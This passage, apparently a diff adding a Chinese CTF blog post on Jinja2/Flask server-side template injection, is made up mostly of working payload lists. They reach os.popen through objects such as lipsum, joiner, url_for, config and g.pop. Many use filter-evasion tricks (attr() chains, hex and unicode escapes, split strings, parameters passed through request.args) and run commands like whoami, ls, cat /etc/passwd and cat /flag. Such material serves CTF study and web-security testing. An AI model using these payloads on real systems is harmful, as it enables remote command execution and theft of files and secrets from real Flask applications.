+</span></span><span class="line"><span class="cl"><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">chr</span>  <span class="p">(</span><span class="n">x为任意值</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​     然后用字符串chr接收，之后就可以用chr()函数了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">BaseCTF</span> <span class="n">week4</span> <span class="n">复读机wp</span><span class="err">（</span><span class="n">为了观感把绕过用的</span><span class="s1">&#39;&#39;</span><span class="n">去掉了</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__base__&#39;</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="mi">137</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;chr&#39;</span><span class="p">]</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cmd</span><span class="o">=</span><span class="s1">&#39;cat &#39;</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">~</span><span class="s1">&#39;flag&#39;</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__base__&#39;</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="mi">137</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="n">cmd</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]())</span><span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​</p>
+<hr>
+<h3 id="-绕过">. 绕过
+</h3><p>​        可以用atter()绕过，也可以用[ ]绕过（这里不做展示）
+​</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__class__&#34;</span><span class="p">)</span><span class="n">就相当于</span><span class="o">.</span><span class="vm">__class__</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>可以借鉴一下这个pyload</p>
+<p>{{lipsum|attr(&rdquo;<strong>globals</strong>&quot;)|attr(&ldquo;get&rdquo;)(&ldquo;os&rdquo;)|attr(&ldquo;popen&rdquo;)(&ldquo;whoami&rdquo;)|attr(&ldquo;read&rdquo;)()}}</p>
+<p>这里这个pyload是改自
+{{lipsum.<em>globals</em>.<strong>get(&ldquo;os&rdquo;)</strong>.popen(&lsquo;whoami&rsquo;).read()}}</p>
+<p>这里值得注意的是（不用get）
+{{lipsum.<em>globals</em><strong>.os</strong>.popen(&lsquo;whoami&rsquo;).read()}}是成立的</p>
+<p>但是，
+{{lipsum|attr(&quot;<strong>globals</strong>&quot;)|attr**(&ldquo;get&rdquo;)(&ldquo;os&rdquo;)**|attr(&ldquo;popen&rdquo;)(&ldquo;whoami&rdquo;)|attr(&ldquo;read&rdquo;)()}}
+如果不加get，就会失败</p>
+<p><img src="/p/ssti/d78c7887fbca45dc840237c715336356.png"
+	width="1469"
+	height="463"
+	srcset="/p/ssti/d78c7887fbca45dc840237c715336356_hu17800168690291735914.png 480w, /p/ssti/d78c7887fbca45dc840237c715336356_hu10923554992749588075.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="761px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<hr>
+<h3 id="绕过">{{绕过
+</h3><p>​        不能用{{}}，可以用{%%}代替，不过{%%}没有显示，要加一个print
+<img src="/p/ssti/ea9d3bdcc2254f439dff78e41ade374c.png"
+	width="1467"
+	height="449"
+	srcset="/p/ssti/ea9d3bdcc2254f439dff78e41ade374c_hu6279749888131123102.png 480w, /p/ssti/ea9d3bdcc2254f439dff78e41ade374c_hu11167280424515613627.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="326"
+		data-flex-basis="784px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<h2 id="好用的pyload">好用的pyload！！
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u0067\u0065\u0074</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\u006f\u0073</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u0070\u006f\u0070\u0065\u006e</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;ls /&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\u0072\u0065\u0061\u0064</span><span class="s2">&#34;</span><span class="p">)()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">joiner</span><span class="p">[</span><span class="s2">&#34;__init__&#34;</span><span class="p">][</span><span class="s2">&#34;__globals__&#34;</span><span class="p">][</span><span class="s2">&#34;o&#34;&#34;s&#34;</span><span class="p">][</span><span class="s2">&#34;pop&#34;</span><span class="o">+</span><span class="s2">&#34;en&#34;</span><span class="p">](</span><span class="s2">&#34;t&#34;&#34;ac /f???&#34;</span><span class="p">)[</span><span class="s2">&#34;re&#34;&#34;ad&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">namespace</span><span class="p">[</span><span class="s2">&#34;__init__&#34;</span><span class="p">][</span><span class="s2">&#34;__globals__&#34;</span><span class="p">][</span><span class="s2">&#34;o&#34;&#34;s&#34;</span><span class="p">][</span><span class="s2">&#34;pop&#34;</span><span class="o">+</span><span class="s2">&#34;en&#34;</span><span class="p">](</span><span class="s2">&#34;t&#34;&#34;ac /f???&#34;</span><span class="p">)[</span><span class="s2">&#34;re&#34;&#34;ad&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="p">[</span><span class="s2">&#34;__globals__&#34;</span><span class="p">][</span><span class="s2">&#34;o&#34;&#34;s&#34;</span><span class="p">][</span><span class="s2">&#34;pop&#34;</span><span class="o">+</span><span class="s2">&#34;en&#34;</span><span class="p">](</span><span class="s2">&#34;t&#34;&#34;ac /f???&#34;</span><span class="p">)[</span><span class="s2">&#34;re&#34;&#34;ad&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">joiner</span><span class="p">[</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x69\x6e\x69\x74\x5f\x5f</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x6f\x73</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x70\x6f\x70\x65\x6e</span><span class="s2">&#34;</span><span class="p">](</span><span class="s2">&#34;ls /&#34;</span><span class="p">)[</span><span class="s2">&#34;</span><span class="se">\x72\x65\x61\x64</span><span class="s2">&#34;</span><span class="p">]()}}</span>	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">joiner</span><span class="p">[</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x69\x6e\x69\x74\x5f\x5f</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x6f\x73</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x70\x6f\x70\x65\x6e</span><span class="s2">&#34;</span><span class="p">](</span><span class="s2">&#34;t&#34;&#34;ac /f*&#34;</span><span class="p">)[</span><span class="s2">&#34;</span><span class="se">\x72\x65\x61\x64</span><span class="s2">&#34;</span><span class="p">]()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">没</span><span class="n">ban</span>  <span class="n">request</span>  <span class="err">可以考虑用这个</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">glo</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">ge</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">po</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">re</span><span class="p">)()}}</span><span class="o">&amp;</span><span class="n">glo</span><span class="o">=</span><span class="n">__globals__</span><span class="o">&amp;</span><span class="n">ge</span><span class="o">=</span><span class="n">__getitem__</span><span class="o">&amp;</span><span class="n">o</span><span class="o">=</span><span class="n">os</span><span class="o">&amp;</span><span class="n">po</span><span class="o">=</span><span class="n">popen</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span><span class="o">&amp;</span><span class="n">re</span><span class="o">=</span><span class="n">read</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">贴一下别人的武器库</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span> <span class="n">c</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;&lt;command&gt;&#39;).read()&#34;</span><span class="p">)</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">75</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#config</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">{{config}}可以获取当前设置，如果题目类似app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;），
+</span></span></span><span class="line"><span class="cl"><span class="s1">那可以直接访问{{config[&#39;FLAG&#39;]}}或者{{config.FLAG}}得到flag
+</span></span></span><span class="line"><span class="cl"><span class="s1">{{self}} ⇒ &lt;TemplateReference None&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;dir&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#全局变量</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">flask提供了两个内置的全局函数：url_for、get_flashed_messages，两个都有__globals__键；
+</span></span></span><span class="line"><span class="cl"><span class="s1">jinja2一共有3个内置的全局函数：range、lipsum、dict，其中只有lipsum有__globals__键
+</span></span></span><span class="line"><span class="cl"><span class="s1">g对象全称flask.g，它会保存当前的全局变量。g.pop 则是 g 对象的一个方法，
+</span></span></span><span class="line"><span class="cl"><span class="s1">其用途是从 g 对象里移除指定键对应的值并返回该值。
+</span></span></span><span class="line"><span class="cl"><span class="s1">其它详见https://flask.palletsprojects.com/zh-cn/stable/templating/
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">g</span><span class="o">.</span><span class="n">pop</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">application</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="bp">self</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">cycler</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">joiner</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">namespace</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#undefined类</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">在渲染().__class__.__base__.__subclasses__().c.__init__初始化一个类时，此处由于不存在c类理论上应该
+</span></span></span><span class="line"><span class="cl"><span class="s1">报错停止执行，但是实际上并不会停止执行，这是由于Jinja2内置了**Undefined**类型，渲染结果显示为
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;，所以看起来并不存在的c类实际上触发了内置的**Undefined**类型。
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;C:\Windows\win.ini&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">g</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;pop&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__import__&#39;</span><span class="p">)(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">)(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">g</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort__&#39;</span><span class="p">](</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)[</span><span class="s1">&#39;po&#39;</span><span class="o">+</span><span class="s1">&#39;pen&#39;</span><span class="p">](</span><span class="s1">&#39;ls&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;application&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">builtins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">import</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">)(</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">g</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">glob&#39;</span><span class="o">+</span><span class="s1">&#39;als</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">buil&#39;</span><span class="o">+</span><span class="s1">&#39;tins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">](</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)[</span><span class="s1">&#39;po&#39;</span><span class="o">+</span><span class="s1">&#39;pen&#39;</span><span class="p">](</span><span class="s1">&#39;ls&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()}}</span>
